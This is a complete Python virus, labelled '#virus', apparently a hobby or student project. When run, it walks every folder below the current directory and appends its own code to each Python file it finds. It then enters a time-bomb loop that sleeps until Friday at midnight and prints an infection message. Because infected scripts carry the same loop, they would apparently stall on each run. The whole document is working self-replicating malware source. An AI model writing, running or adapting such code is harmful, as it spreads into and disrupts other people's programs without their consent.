#virus
import datetime
import os
import time
message = "You have been infected By <Yoni Ifrah>"
filename = os.path.basename(__file__)

def infectFiles(folder):
    """
        infects all the python files in the folder and his subfilders
        the infect is a copy of this code
    Args:
        folder (_type_): the directory to start from
    """
    for root, dirs, files in os.walk(folder):
        for file in files:
            if file == filename:    continue
            if file.endswith('.py'):
                with open(os.path.join(root, file), 'r') as f:
                    contents = f.read()
                    
                if not message in contents:
                    with open(__file__, "r") as f:
                        code = f.read()
                        for char in code.splitlines():
                            if char != '#virus':
                                code = code.replace(char, "")
                            else:
                                break
                        contents = contents + code
                    
                    with open(os.path.join(root, file), 'w') as f:
                        f.write(contents)

def timeBomb(desired_day = 'Friday', desired_hour=0):
    """
        print the message variable according to the desired day and hour
    Args:
        desired_day (str, optional): the day to print the message. Defaults to 'Friday'.
        desired_hour (int, optional): the hour to print the message. Defaults to 0.
    """
    current_time = datetime.datetime.now()
    while True:
        if current_time.strftime('%A') == desired_day and current_time.hour == desired_hour:
            print(message)
            break 
        else:
            time.sleep(3600)  # wait 1 hour and check the time again
            current_time = datetime.datetime.now() 

infectFiles('.')
timeBomb()
